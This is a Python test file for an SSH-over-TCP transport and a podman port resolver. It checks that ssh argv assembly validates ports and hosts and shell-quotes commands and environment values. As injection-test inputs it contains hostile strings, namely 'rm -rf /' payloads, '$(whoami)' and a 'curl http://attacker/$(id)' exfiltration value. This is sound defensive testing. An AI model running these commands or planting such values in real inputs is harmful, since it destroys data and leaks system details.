# SPDX-FileCopyrightText: 2026 Jiri Vyskocil
# SPDX-License-Identifier: Apache-2.0

"""Tests for `TcpSSHTransport` and `podman_port_resolver`.

Real SSH never runs — every test mocks ``subprocess.run`` /
``subprocess.Popen`` and asserts the assembled argv.  The transport
itself is shape-only: the only "logic" it owns is the argv it emits
and where it routes streams.
"""

from __future__ import annotations

import io
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from terok_sandbox.runtime import ExecResult, KrunTransport
from terok_sandbox.runtime.krun_transport import (
    DEFAULT_GUEST_SSHD_PORT,
    TcpEndpoint,
    TcpSSHTransport,
    podman_port_resolver,
)


class _StubContainer:
    """Minimal container handle — only ``name`` is read."""

    def __init__(self, name: str) -> None:
        self.name = name


def _make_transport(*, port: int = 12345, host: str = "127.0.0.1") -> TcpSSHTransport:
    """Build a transport whose resolver returns a fixed endpoint."""
    return TcpSSHTransport(
        identity_file=Path("/tmp/host.key"),  # noqa: S108 — test-only path
        endpoint_resolver=lambda _ctr: TcpEndpoint(port=port, host=host),
    )


class TestTcpEndpoint:
    """Trivial value type — assert defaults + frozen-dataclass semantics."""

    def test_host_defaults_to_loopback(self) -> None:
        """Forwarded ports are bound to ``127.0.0.1`` by the orchestrator."""
        assert TcpEndpoint(port=12345).host == "127.0.0.1"

    def test_frozen(self) -> None:
        ep = TcpEndpoint(port=12345)
        with pytest.raises(AttributeError):
            ep.port = 12346  # type: ignore[misc]

    def test_coerces_int_convertible_string(self) -> None:
        """``port="12345"`` is a valid input — defensive coercion."""
        ep = TcpEndpoint(port="12345")  # type: ignore[arg-type]
        assert ep.port == 12345

    def test_rejects_port_zero(self) -> None:
        """Port 0 is invalid — kernel-assigned and would prompt random reads."""
        with pytest.raises(ValueError, match="port 0"):
            TcpEndpoint(port=0)

    def test_rejects_out_of_range_port(self) -> None:
        """Port > u16 max is structurally invalid (TCP wire format)."""
        with pytest.raises(ValueError, match="outside"):
            TcpEndpoint(port=2**16)

    def test_rejects_non_int_convertible(self) -> None:
        """Strings carrying shell metachars would otherwise hit ssh argv."""
        with pytest.raises(ValueError, match="int-convertible"):
            TcpEndpoint(port="12345; rm -rf /")  # type: ignore[arg-type]

    @pytest.mark.parametrize(
        "bad_host",
        [
            "host with space",
            "127.0.0.1; rm -rf /",
            "$(whoami)",
            "host`reboot`",
            "-leading-dash",
            "",
        ],
    )
    def test_rejects_malformed_host(self, bad_host: str) -> None:
        """Hosts carrying shell metachars are refused at construction.

        The transport interpolates *host* into the ``user@host`` ssh
        argv token; anything outside the loopback/hostname charset
        would otherwise reach the system ssh CLI.
        """
        with pytest.raises(ValueError, match="must match"):
            TcpEndpoint(port=12345, host=bad_host)


class TestTcpSSHTransportArgv:
    """Argv assembly is the only side-effect-free thing in the transport."""

    def test_implements_protocol(self) -> None:
        """`TcpSSHTransport` is structurally a `KrunTransport`."""
        assert isinstance(_make_transport(), KrunTransport)

    def test_argv_carries_port_flag(self) -> None:
        """``-p <port>`` is the connection target — no ProxyCommand needed."""
        argv = _make_transport(port=42201)._ssh_argv(TcpEndpoint(port=42201))
        port_idx = argv.index("-p")
        assert argv[port_idx + 1] == "42201"
        # Sanity: no socat / VSOCK leftovers from the prior design.
        assert not any("VSOCK" in tok or "socat" in tok for tok in argv)
        assert not any("ProxyCommand" in tok for tok in argv)

    def test_argv_uses_batch_and_disables_host_key_check(self) -> None:
        """No prompts; loopback-only port + experimental gate obviate persistence."""
        argv = _make_transport()._ssh_argv(TcpEndpoint(port=12345))
        opts = [argv[i + 1] for i, t in enumerate(argv) if t == "-o"]
        assert "BatchMode=yes" in opts
        assert "StrictHostKeyChecking=no" in opts
        assert "UserKnownHostsFile=/dev/null" in opts

    def test_argv_uses_identities_only(self) -> None:
        """``IdentitiesOnly=yes`` keeps a stray ssh-agent from being consulted.

        Without it, a host-level ssh-agent carrying unrelated identities
        could offer them to the guest sshd; only the explicit ``-i``
        identity should be used.
        """
        argv = _make_transport()._ssh_argv(TcpEndpoint(port=12345))
        opts = [argv[i + 1] for i, t in enumerate(argv) if t == "-o"]
        assert "IdentitiesOnly=yes" in opts

    def test_argv_carries_identity_file(self) -> None:
        """``-i <key_path>`` carries the host-side private key."""
        argv = _make_transport()._ssh_argv(TcpEndpoint(port=12345))
        idx = argv.index("-i")
        assert argv[idx + 1] == "/tmp/host.key"

    def test_argv_user_at_loopback_host(self) -> None:
        """Last argv entry is ``dev@<host>`` — host is the loopback the port is bound to."""
        argv = _make_transport(host="127.0.0.1")._ssh_argv(TcpEndpoint(port=12345))
        assert argv[-1] == "dev@127.0.0.1"


class TestTcpSSHTransportExec:
    """`exec` shells out and packages the result into an `ExecResult`."""

    def test_exec_invokes_ssh_with_remote_command(self) -> None:
        with patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="hi\n", stderr=""
            )
            result = _make_transport(port=12345).exec(_StubContainer("ctr"), ["echo", "hi"])
        argv = run.call_args[0][0]
        # `--` separates ssh flags from the (single) remote command string.
        # Argv semantics are preserved across sshd's shell-parsing by
        # shlex-quoting each token into one string.
        assert "--" in argv
        sep = argv.index("--")
        assert argv[sep + 1 :] == ["echo hi"]
        assert result == ExecResult(exit_code=0, stdout="hi\n", stderr="")

    def test_exec_propagates_nonzero_exit_and_stderr(self) -> None:
        with patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=42, stdout="", stderr="boom\n"
            )
            result = _make_transport().exec(_StubContainer("ctr"), ["false"])
        assert result == ExecResult(exit_code=42, stdout="", stderr="boom\n")

    def test_exec_propagates_timeout(self) -> None:
        with patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="", stderr=""
            )
            _make_transport().exec(_StubContainer("ctr"), ["true"], timeout=5.0)
        assert run.call_args.kwargs.get("timeout") == 5.0

    def test_exec_resolves_endpoint_per_container(self) -> None:
        """The endpoint resolver is called with the actual container handle."""
        seen: list[str] = []

        def resolver(container):  # type: ignore[no-untyped-def]
            seen.append(container.name)
            return TcpEndpoint(port=12345)

        transport = TcpSSHTransport(
            identity_file=Path("/tmp/host.key"),  # noqa: S108
            endpoint_resolver=resolver,
        )
        with patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="", stderr=""
            )
            transport.exec(_StubContainer("task-abc"), ["true"])
        assert seen == ["task-abc"]


class TestTcpSSHTransportExecStdio:
    """`exec_stdio` spawns a Popen and bridges stdio via the pump helpers."""

    def test_env_is_prefixed_on_remote_side(self) -> None:
        """``env K=V`` prefix avoids dependence on guest's `AcceptEnv`."""
        with patch("subprocess.Popen") as popen:
            proc = MagicMock()
            proc.stdin = io.BytesIO()
            proc.stdout = io.BytesIO()
            proc.stderr = None
            proc.wait.return_value = 0
            popen.return_value = proc
            _make_transport().exec_stdio(
                _StubContainer("ctr"),
                ["sh"],
                stdin=io.BytesIO(),
                stdout=io.BytesIO(),
                env={"FOO": "1", "BAR": "x"},
            )
        argv = popen.call_args[0][0]
        sep = argv.index("--")
        # The whole remote command is a single shlex-quoted string at
        # argv[-1]; env tokens come first, then the cmd.
        remote = argv[sep + 1]
        assert remote.startswith("env ")
        assert "FOO=1" in remote
        assert "BAR=x" in remote
        assert remote.endswith(" sh")

    def test_no_env_skips_prefix(self) -> None:
        """Without env, the remote command is just the (quoted) argv."""
        with patch("subprocess.Popen") as popen:
            proc = MagicMock()
            proc.stdin = io.BytesIO()
            proc.stdout = io.BytesIO()
            proc.stderr = None
            proc.wait.return_value = 7
            popen.return_value = proc
            rc = _make_transport().exec_stdio(
                _StubContainer("ctr"),
                ["sh"],
                stdin=io.BytesIO(),
                stdout=io.BytesIO(),
            )
        argv = popen.call_args[0][0]
        sep = argv.index("--")
        assert argv[sep + 1 :] == ["sh"]
        assert rc == 7

    def test_shell_metacharacters_in_cmd_are_quoted(self) -> None:
        """``cmd=["echo", "; rm -rf /"]`` does NOT inject a remote rm.

        sshd concatenates the post-``--`` tokens and hands them to the
        in-guest user's shell; the transport must quote each token so
        the API's argv contract holds across the shell boundary.
        """
        with patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="", stderr=""
            )
            _make_transport().exec(
                _StubContainer("ctr"),
                ["echo", "; rm -rf /"],
            )
        remote = run.call_args[0][0][-1]
        # The injected metachar block survives only as a quoted literal —
        # the remote shell will see ``echo '; rm -rf /'`` and treat the
        # second token as the literal echoed string.
        assert "'; rm -rf /'" in remote
        # Sanity: no unquoted ``;`` anywhere in the remote command.
        assert "; rm -rf /;" not in remote and "echo ; " not in remote

    def test_shell_metacharacters_in_env_value_are_quoted(self) -> None:
        """A hostile env value can't escape the ``env K=V`` shape either."""
        with patch("subprocess.Popen") as popen:
            proc = MagicMock()
            proc.stdin = io.BytesIO()
            proc.stdout = io.BytesIO()
            proc.stderr = None
            proc.wait.return_value = 0
            popen.return_value = proc
            _make_transport().exec_stdio(
                _StubContainer("ctr"),
                ["sh"],
                stdin=io.BytesIO(),
                stdout=io.BytesIO(),
                env={"X": "1; curl http://attacker/$(id)"},
            )
        remote = popen.call_args[0][0][-1]
        # The hostile value lives inside a single-quoted shell literal;
        # the remote ``env`` command will see X with that exact string.
        assert "'X=1; curl http://attacker/$(id)'" in remote

    def test_env_var_name_must_be_valid_identifier(self) -> None:
        """Names like ``"X; rm -rf /"`` are rejected up front."""
        with patch("subprocess.Popen"):
            with pytest.raises(ValueError, match="must match"):
                _make_transport().exec_stdio(
                    _StubContainer("ctr"),
                    ["sh"],
                    stdin=io.BytesIO(),
                    stdout=io.BytesIO(),
                    env={"X; rm -rf /": "1"},
                )

    def test_empty_cmd_rejected(self) -> None:
        """Empty argv is a contract violation, not "no remote command"."""
        with patch("subprocess.run"):
            with pytest.raises(ValueError, match="must not be empty"):
                _make_transport().exec(_StubContainer("ctr"), [])

    def test_timeout_escalates_terminate_then_kill(self) -> None:
        """If the child also ignores terminate, the cleanup escalates to kill.

        Mirrors the same terminate→wait→kill→wait pattern PodmanRuntime uses
        for ``podman exec``.  Covers the rarely-hit cleanup branch
        (lines 185-192) so a future refactor doesn't silently leave a child
        wedged after timeout.
        """
        with patch("subprocess.Popen") as popen:
            proc = MagicMock()
            proc.stdin = io.BytesIO()
            proc.stdout = io.BytesIO()
            proc.stderr = None
            # First wait → timeout (initial run); second wait → still
            # timed out (post-terminate grace); third wait (after kill)
            # → succeeds.  raise sequence drives the escalation.
            proc.wait.side_effect = [
                subprocess.TimeoutExpired(cmd="ssh", timeout=1.0),
                subprocess.TimeoutExpired(cmd="ssh", timeout=2.0),
                None,
            ]
            popen.return_value = proc
            with pytest.raises(subprocess.TimeoutExpired):
                _make_transport().exec_stdio(
                    _StubContainer("ctr"),
                    ["sh"],
                    stdin=io.BytesIO(),
                    stdout=io.BytesIO(),
                    timeout=1.0,
                )
        proc.terminate.assert_called_once()
        proc.kill.assert_called_once()


class TestTcpSSHTransportLoginCommand:
    """`login_command` mirrors `PodmanContainer.login_command` shape — argv only, no I/O."""

    def test_argv_uses_pty_flag_not_batchmode(self) -> None:
        """Interactive login forces a PTY (``-tt``) and drops ``BatchMode``."""
        transport = _make_transport(port=12345)
        argv = transport.login_command(_StubContainer("ctr"))
        assert "-tt" in argv
        # BatchMode is the exec/non-interactive marker — must be absent here.
        assert "BatchMode=yes" not in argv

    def test_argv_targets_resolved_endpoint(self) -> None:
        """``-p`` carries the port returned by the resolver."""
        transport = _make_transport(port=42201)
        argv = transport.login_command(_StubContainer("ctr"))
        port_idx = argv.index("-p")
        assert argv[port_idx + 1] == "42201"

    def test_argv_ends_with_user_at_host(self) -> None:
        """Last argv entry is ``dev@127.0.0.1`` when *command* is empty."""
        transport = _make_transport(host="127.0.0.1")
        argv = transport.login_command(_StubContainer("ctr"))
        assert argv[-1] == "dev@127.0.0.1"

    def test_command_is_shlex_quoted_after_double_dash(self) -> None:
        """Per-token shell metacharacters cross the wire as literal data."""
        transport = _make_transport()
        argv = transport.login_command(
            _StubContainer("ctr"),
            command=("bash", "-c", "echo 'hi there'"),
        )
        # The remote-command string lives after ``--``.
        dash_idx = argv.index("--")
        remote = argv[dash_idx + 1]
        # The single-quoted string in the user-supplied command should be
        # re-quoted so the in-guest shell sees argv[2] as the literal
        # "echo 'hi there'" rather than splitting on the inner quotes.
        assert "echo" in remote
        assert "'hi there'" in remote

    def test_login_command_satisfies_transport_protocol(self) -> None:
        """`TcpSSHTransport` still satisfies the `KrunTransport` protocol after the addition."""
        assert isinstance(_make_transport(), KrunTransport)


class TestPodmanPortResolver:
    """The default resolver shells `podman port` for the host-side mapping."""

    def test_returns_endpoint_from_mapping(self) -> None:
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="127.0.0.1:42201\n"):
            endpoint = resolver(_StubContainer("ctr"))
        assert endpoint == TcpEndpoint(port=42201, host="127.0.0.1")

    def test_overrides_host_to_loopback_even_when_podman_says_zero(self) -> None:
        """``podman port`` may print ``0.0.0.0:N`` if the operator added an
        ``-p 0.0.0.0:N:22`` mapping; the resolver still pins the connect
        target to *host* (loopback by default) so the ssh argv doesn't
        accidentally route via an external interface."""
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="0.0.0.0:12345\n"):
            endpoint = resolver(_StubContainer("ctr"))
        assert endpoint.host == "127.0.0.1"
        assert endpoint.port == 12345

    def test_uses_custom_host(self) -> None:
        resolver = podman_port_resolver(host="127.0.0.42")
        with patch("subprocess.check_output", return_value="127.0.0.1:12345\n"):
            endpoint = resolver(_StubContainer("ctr"))
        assert endpoint.host == "127.0.0.42"

    def test_uses_custom_guest_port(self) -> None:
        """The query target is the guest port — caller can override the default."""
        resolver = podman_port_resolver(guest_port=5555)
        with patch("subprocess.check_output", return_value="127.0.0.1:12345\n") as ck:
            resolver(_StubContainer("ctr"))
        argv = ck.call_args[0][0]
        assert argv[-1] == "5555/tcp"

    def test_default_guest_port_is_unprivileged(self) -> None:
        """`DEFAULT_GUEST_SSHD_PORT` matches the L0 image's rootless sshd.

        Must be ≥ 1024 — under krun, virtiofs is mounted ``nosuid`` so
        ``sudo`` can't elevate and uid 1000 can't bind privileged ports.
        Pinning ``>= 1024`` here catches a regression that lowers this
        value back into the privileged range.
        """
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="127.0.0.1:12345\n") as ck:
            resolver(_StubContainer("ctr"))
        argv = ck.call_args[0][0]
        assert argv[-1] == f"{DEFAULT_GUEST_SSHD_PORT}/tcp"
        assert DEFAULT_GUEST_SSHD_PORT >= 1024

    def test_raises_when_mapping_empty(self) -> None:
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="\n"):
            with pytest.raises(RuntimeError, match="no .* port mapping"):
                resolver(_StubContainer("ctr"))

    def test_raises_when_output_malformed(self) -> None:
        """Output without a ``host:port`` shape is refused before reaching ssh."""
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="just-a-bare-token\n"):
            with pytest.raises(RuntimeError, match="doesn't look like"):
                resolver(_StubContainer("ctr"))

    def test_raises_when_port_not_integer(self) -> None:
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="127.0.0.1:not-a-port\n"):
            with pytest.raises(RuntimeError, match="non-integer port"):
                resolver(_StubContainer("ctr"))

    def test_raises_when_podman_port_fails(self) -> None:
        """A non-zero exit from podman (e.g. no mapping) surfaces as RuntimeError."""
        resolver = podman_port_resolver()
        with patch(
            "subprocess.check_output",
            side_effect=subprocess.CalledProcessError(1, "podman"),
        ):
            with pytest.raises(RuntimeError, match="podman port failed"):
                resolver(_StubContainer("ctr"))

    def test_port_call_uses_timeout(self) -> None:
        """``podman port`` is invoked with a timeout so a wedged daemon doesn't hang the resolver."""
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="127.0.0.1:12345\n") as ck:
            resolver(_StubContainer("ctr"))
        timeout = ck.call_args.kwargs.get("timeout")
        assert timeout is not None
        assert timeout > 0

    def test_translates_timeout_to_runtime_error(self) -> None:
        """A ``TimeoutExpired`` from ``check_output`` becomes the resolver's
        uniform ``RuntimeError`` (same exception shape as missing/invalid
        mapping), so callers don't have to special-case three error
        types from one resolver method."""
        resolver = podman_port_resolver()
        with (
            patch(
                "subprocess.check_output",
                side_effect=subprocess.TimeoutExpired(cmd="podman", timeout=5.0),
            ),
            pytest.raises(RuntimeError, match="podman port timed out"),
        ):
            resolver(_StubContainer("ctr"))

    def test_port_argv_uses_end_of_options_separator(self) -> None:
        """``--`` before the container name blocks option-name injection.

        A handle with a leading-dash name (``"--all"``) would otherwise be
        reparsed by podman as a flag.  The end-of-options ``--`` makes
        everything after it positional.
        """
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="127.0.0.1:12345\n") as ck:
            resolver(_StubContainer("hostile-name"))
        argv = ck.call_args[0][0]
        assert "--" in argv
        # After ``--``: container name, then guest-port spec.
        assert argv[argv.index("--") + 1 :] == ["hostile-name", f"{DEFAULT_GUEST_SSHD_PORT}/tcp"]

    def test_rejects_zero_port_from_mapping(self) -> None:
        """A misconfigured mapping handing back port 0 is refused at the boundary."""
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="127.0.0.1:0\n"):
            with pytest.raises(RuntimeError, match="invalid forwarded port"):
                resolver(_StubContainer("ctr"))

    def test_rejects_out_of_range_port_from_mapping(self) -> None:
        """A port outside u16 range is refused before reaching ssh argv."""
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="127.0.0.1:999999\n"):
            with pytest.raises(RuntimeError, match="invalid forwarded port"):
                resolver(_StubContainer("ctr"))

    def test_picks_first_line_when_multiple_mappings(self) -> None:
        """``podman port`` can emit multiple lines if the operator added several
        ``-p`` flags for the same guest port; take the first one."""
        resolver = podman_port_resolver()
        with patch("subprocess.check_output", return_value="127.0.0.1:12222\n0.0.0.0:23333\n"):
            endpoint = resolver(_StubContainer("ctr"))
        assert endpoint.port == 12222
